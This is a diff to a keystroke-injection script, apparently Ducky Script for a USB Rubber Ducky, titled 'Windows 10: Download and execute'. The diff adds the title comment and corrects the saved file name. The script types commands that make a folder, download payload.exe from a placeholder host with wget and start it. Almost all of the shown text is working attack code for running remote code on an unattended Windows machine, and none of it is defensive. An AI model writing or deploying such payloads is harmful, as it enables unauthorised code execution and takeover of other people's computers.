@@ -1,3 +1,7 @@
+REM ====================================
+REM = Windows 10: Download and execute =
+REM ====================================
+
 DELAY 2000
 GUI d
 DELAY 400
@@ -18,7 +22,7 @@ STRING mkdir /win
 ENTER
 STRING cd /win
 ENTER
-STRING wget 'http://www.example.com/payload.exe' -OutFile payload.pdf
+STRING wget 'http://www.example.com/payload.exe' -OutFile payload.exe
 ENTER
 DELAY 500
 STRING START payload.exe
